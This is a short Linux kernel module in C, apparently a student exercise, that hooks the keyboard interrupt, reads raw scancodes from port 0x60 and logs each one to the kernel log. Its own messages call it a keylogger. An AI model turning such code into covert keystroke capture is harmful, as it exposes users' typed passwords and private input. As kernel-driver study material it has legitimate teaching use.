#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adam Taguirov <ataguiro@student.42.fr>");
MODULE_DESCRIPTION("Keyboard interrupt handler");

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	static unsigned char scancode;
	
	scancode = inb (0x60);

	printk ("Received %d\n", scancode);

	return (irq_handler_t) IRQ_HANDLED;
}

static int __init hello_init(void) {
	printk(KERN_INFO "Keyboard keylogger initialized !\n");
	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
}

static void __exit hello_cleanup(void) {
	printk(KERN_INFO "Destroying keylogger module.\n");
	free_irq(1, (void *)(irq_handler));
}

module_init(hello_init);
module_exit(hello_cleanup);
